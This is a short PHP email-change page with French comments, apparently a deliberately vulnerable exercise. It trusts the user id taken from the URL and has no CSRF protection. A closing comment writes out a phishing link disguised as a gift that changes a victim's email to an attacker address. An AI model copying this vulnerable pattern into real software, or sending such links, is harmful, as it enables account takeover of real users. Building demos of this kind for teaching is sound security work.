// Récupérer les données du formulaire
if (isset($_GET['change_email']) && $_GET['change_email'] == '1') {
    $new_email = $_POST['new_email'];
    $user_id = $_GET['id']; // ID de l'utilisateur connecté (présumé dans l'URL)

    // Appeler la fonction pour changer l'email
    $message = change_email($user_id, $new_email);
    echo "<p>$message</p>";
}
?>
<div class="change-email-form">
    <h2>Changer mon adresse email</h2>
    <form method="POST" action="">
        <input type="email" name="new_email" placeholder="Nouvelle adresse email" required>
        <button type="submit" name="change_email">Changer l'email</button>
    </form>
</div>

//lien a ecrire dans le mail : 
//<a href="http://pages/user/mail.php?id=3&new_email=hacker@example.com&change_email=1">Cliquez ici pour un cadeau!</a>

